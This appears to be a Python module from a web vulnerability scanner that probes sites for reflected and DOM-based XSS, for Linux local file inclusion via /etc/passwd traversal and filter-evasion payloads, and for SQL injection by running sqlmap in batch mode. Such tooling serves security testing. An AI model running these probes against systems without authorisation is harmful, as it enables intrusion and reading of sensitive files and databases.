import requests
from src import toolbox
from src.webutils import get_headers, get_page_source
from urllib.parse import quote_plus
import subprocess
import re

def search_reflection(page:str,payload):
        """
        search for payload inside response page
        """
        line = ""
        cnt = 0
        for c in page:
            cnt += 1
            if c == "\n":
                if line.find(payload) != -1:
                    return True
                line = ""
            else:
                line += c
        return False

def test_reflection(url:str,param:str,method:str,type:str)->str:
    """
    test reflection with a parameter for XSS attack
    """

    payloads = [
        "lincox><",
        "lincox\"=",
        f"</{type}><img src='lincox'>"
    ]

    found = 0
    best_payload = ""

    for payload in payloads:
        if method == "GET":
            r = requests.get(f"{url}/?{param}={quote_plus(payload)}",headers=get_headers())
        elif method == "POST":
            r = requests.post(f"{url}",data={param:payload},headers=get_headers())

        if search_reflection(r.text,payload):
            found += 1
            best_payload = payload

    if found == 0:
        return None
    elif found == 1:
        return best_payload
    elif found == 2:
        return "><\"="
    elif found == 3:
        return f"</{type}><img src='lincox'>"

def test_dom_reflection(url:str,param:str,type:str)->str:
    """
    test reflection with a parameter for DOM based XSS attack
    """ 
    
    payloads = [
        "lincox><",
        "lincox\"=",
        f"</{type}><img src='lincox'>"
    ]

    found = 0
    best_payload = ""

    for payload in payloads:
        page = get_page_source(f"{url}/?{param}={quote_plus(payload)}")
        if search_reflection(page,payload):
            found += 1
            best_payload = payload

    if found == 0:
        return None
    elif found == 1:
        return best_payload
    elif found == 2:
        return "><\"="
    elif found == 3:
        return f"</{type}><img src='lincox'>"

def search_lfi_marker(html,os_type):
    """
    search for LFI markers in a web page
    depending on the OS
    os_type : linux or windows
    """

    if os_type == "linux":
        line = ""
        for c in html:
            if c == '\n':
                if line.find('0:0:root') != -1: # first line of /etc/passwd in linux system
                    return True
                line = ""
            else:
                line += c
    
    # TODO : windows marker
    
    return False
    
def test_lfi_linux(url,params,method):
    """
    test for LFI in parameters with linux payload
    """

    if method.lower() == "get":

        # simple test
        parameters = "?"
        payload = '/etc/passwd'
        for param in params:
            parameters += f"&{param}={quote_plus(payload)}"
        r = requests.get(url+parameters,headers=get_headers())
        result = search_lfi_marker(r.text,"linux")
        if result:
            return parameters

        # simple directory traversal
        for i in range(1,11):
            parameters = "?"
            payload = 'file_lincox/' + '../'*i+'/etc/passwd'
            for param in params:
                parameters += f"&{param}={quote_plus(payload)}"
            r = requests.get(url+parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

        # simple filter evasion
        for i in range(1,11):
            parameters = "?"
            payload = 'file_lincox/' + '..//'*i+'/etc/passwd'
            for param in params:
                parameters += f"&{param}={quote_plus(payload)}"
            r = requests.get(url+parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

    if method.lower() == "post":
        # simple test
        payload = '/etc/passwd'
        parameters = {}
        for param in params:
            parameters[param] = payload
        r = requests.post(url,data=parameters,headers=get_headers())
        result = search_lfi_marker(r.text,"linux")
        if result:
            return parameters

        # simple directory traversal
        for i in range(1,11):
            payload = 'file_lincox/' + '../'*i+'/etc/passwd'
            parameters = {}
            for param in params:
                parameters[param] = payload
            r = requests.post(url,data=parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

        # simple filter evasion
        for i in range(1,11):
            payload = 'file_lincox/' + '..//'*i+'/etc/passwd'
            parameters = {}
            for param in params:
                parameters[param] = payload
            r = requests.post(url,data=parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

    return None

def test_sqli(command,url,params,method):
    """
    use SQL map to search for SQL injection
    no risk/level tuning for now
    """

    
    parameters = ""
    
    for param in params:
        parameters += f"&{param}=lincox"
    
    if method.lower() == "get":
        command = [
            command,
            '-u', url+'?'+parameters,
            '--batch',
            '--output-dir','sqlmap_output',
            '--dump-format=csv',
            '--ignore-code','404'
        ]

    if method.lower() == "post":
        command = [
            command,
            '-u', url,
            '--data',parameters,
            '--batch',
            '--output-dir','sqlmap_output',
            '--dump-format=csv',
            '--ignore-code','404'
        ]
    
    process = subprocess.run(command, capture_output=True, text=True, check=False)

    output = process.stdout
    # if process.returncode != 0 :
    #     toolbox.warn(f"sqlmap returned a non zero error code {process.returncode}")
    #     toolbox.warn(f"sqlmap stderr: {process.stderr}")
    #     print(output)

    # print(output)

    found_parameters = re.finditer(r"---\n(Parameter:.*)---", output,re.MULTILINE|re.DOTALL|re.IGNORECASE)
    results = []

    for parameter in found_parameters:

        pattern = r"""
        \s*Type:\s*(?P<type>.*)\n
        \s*Title:\s*(?P<title>.*)\n
        \s*Payload:\s*(?P<payload>.*)\n
        """

        matches = re.finditer(pattern, parameter.group(), re.VERBOSE)
        parameter = re.findall(r"Parameter: (.+)", parameter.group())[0]

        for match in matches:
            toolbox.debug(f"Found injection {match.group('type')} / {match.group('title')} on {parameter} at {url}")
            results.append((url,method,parameter,match.group("type"),match.group("title"),match.group("payload").strip()))
    
    return results if len(results) > 0 else None